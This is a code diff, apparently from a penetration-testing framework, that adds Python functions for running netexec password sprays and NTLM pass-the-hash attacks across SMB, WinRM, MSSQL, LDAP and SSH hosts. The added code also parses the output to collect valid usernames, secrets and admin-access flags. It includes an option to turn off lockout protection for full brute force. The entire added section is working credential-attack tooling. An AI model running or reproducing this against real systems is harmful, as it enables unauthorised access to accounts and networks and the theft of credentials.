@@ -161,3 +161,77 @@ def build_spray(creds: list[Credential], hosts: list[Host], out_dir: str) -> dic
     commands = spray_commands(creds, hosts, files)
     return {"dir": cred_dir, "files": files, "commands": commands,
             "targets": spray_targets(hosts)}
+
+
+def _parse_nxc_hits(output: str) -> list[dict]:
+    """Successful logins from ANY netexec/nxc run. Every protocol prints a hit as
+    '<PROTO> <ip> <port> <host> [+] domain\\user:secret (Pwn3d!)' - key off the IP
+    (first address-looking token) + the '[+] …:…' marker + the '(Pwn3d!)' admin flag."""
+    import ipaddress
+    hits: list[dict] = []
+    for line in output.splitlines():
+        if "[+]" not in line:
+            continue
+        ip = ""
+        for tok in line.split()[1:4]:
+            try:
+                ipaddress.ip_address(tok)
+                ip = tok
+                break
+            except ValueError:
+                continue
+        after = line.split("[+]", 1)[1].strip()
+        admin = "Pwn3d" in after or "(admin)" in after.lower()
+        cred = after.split("(")[0].strip()
+        if ":" not in cred:
+            continue
+        user, secret = cred.split(":", 1)
+        hits.append({"ip": ip, "user": user.strip(), "secret": secret.strip(),
+                     "cred": cred, "admin": admin})
+    return hits
+
+
+def run_spray(hosts: list[Host], creds: list[Credential], out_dir: str, *,
+              safe: bool = True, protocols=None, timeout: int = 1200) -> dict:
+    """EXECUTE the spray with netexec and return the validated logins. Lockout-safe by
+    default: --no-bruteforce pairs user<->pass line-by-line and does a single pass, so a
+    domain lockout policy isn't tripped. safe=False drops --no-bruteforce = full
+    user x password (real lockout risk - opt-in only). Needs nxc/netexec on PATH."""
+    from . import credenum
+    tool = credenum.smb_tool()
+    if not tool:
+        return {"ok": False, "error": "netexec/nxc not installed", "hits": [], "commands": []}
+    files = write_files(creds, os.path.join(out_dir, "creds"))
+    if not files.get("users.txt"):
+        return {"ok": False, "error": "no usernames to spray", "hits": [], "commands": []}
+    targets = spray_targets(hosts)
+    protos = protocols or ["smb", "winrm", "mssql", "ldap", "ssh"]
+    brute = [] if not safe else ["--no-bruteforce"]
+    hits: list[dict] = []
+    ran: list[str] = []
+    for proto in protos:
+        ips = targets.get(proto) or []
+        if not ips:
+            continue
+        tgt = _target_expr(ips).split()
+        runs = []
+        if "passwords.txt" in files:
+            runs.append([tool, proto, *tgt, "-u", files["users.txt"], "-p",
+                         files["passwords.txt"], "--continue-on-success", *brute])
+        if "nthashes.txt" in files and proto in ("smb", "winrm", "ldap", "mssql"):
+            runs.append([tool, proto, *tgt, "-u", files["users.txt"], "-H",
+                         files["nthashes.txt"], "--continue-on-success", *brute])
+        for cmd in runs:
+            out, _err = credenum._run(cmd, timeout=timeout)
+            ran.append(" ".join(cmd))
+            for h in _parse_nxc_hits(out or ""):
+                h["proto"] = proto
+                hits.append(h)
+    seen: set = set()
+    uniq = []
+    for h in hits:
+        k = (h["proto"], h["ip"], h["cred"])
+        if k not in seen:
+            seen.add(k)
+            uniq.append(h)
+    return {"ok": True, "hits": uniq, "commands": ran, "files": files, "safe": safe}
